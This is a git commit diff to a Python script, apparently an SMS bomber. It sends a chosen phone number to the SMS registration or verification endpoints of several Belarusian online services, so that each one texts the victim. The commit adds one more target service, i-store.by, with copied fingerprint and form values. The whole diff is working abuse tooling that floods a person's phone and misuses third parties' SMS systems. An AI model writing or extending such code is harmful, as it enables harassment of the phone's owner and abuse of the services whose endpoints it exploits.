42cd090f9c368c77f6edad0f13e3ae1d894bc4a5
mistikmistio <minerkik@gmail.com>
2023-10-31 19:16:55 +0300

    OneCommit

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-#import os, sys
+import os, sys
 #import fake_useragent
 import requests
 #import time
@@ -42,7 +42,7 @@ dates = {
 }
 
 response = requests.post('https://delivio.by/be/api/register', json={"phone": f"{phone}"}, headers=headers1)
-if response.status_code == 201 or response.status_code == 200:
+if response.status_code == 201:
     print("Смс от delivio отправлено!")
 else:
     print("Смс от delivio не отправлено!")
@@ -81,3 +81,17 @@ if response.status_code == 200:
     print('Смс от gippo-market отправлено!')
 else:
     print('Смс от gippo-market не отправлено!')
+    
+
+dates = {
+	"bxajaxid": "ajax",
+	"auth_action": "send_code_sms",
+	"PHONE": f"{phone}"
+}
+
+response = requests.post('https://i-store.by/api/apr/temporary-register', json={"login":f"{phone}","uaewbfjswrswexpdkrgj":"jpjgolyqqfamoipphtcw","fingerprint":"e05d741905b4e28c6fcd4ceeff28a29cf3feb90ff99156c6acc08ba742660be2","slug":"?gad=1&gclid=Cj0KCQjwy4KqBhD0ARIsAEbCt6heNVLKTXHLV8sUsaf-ShowlCWEQJ6nqEbIvyqwjKXCbaE1h97C7vMaAgsZEALw_wcB"}, headers=headers1)
+
+if response.status_code == 200:
+    print('Смс от i-store отправлено!')
+else:
+    print('Смс от i-store не отправлено!')
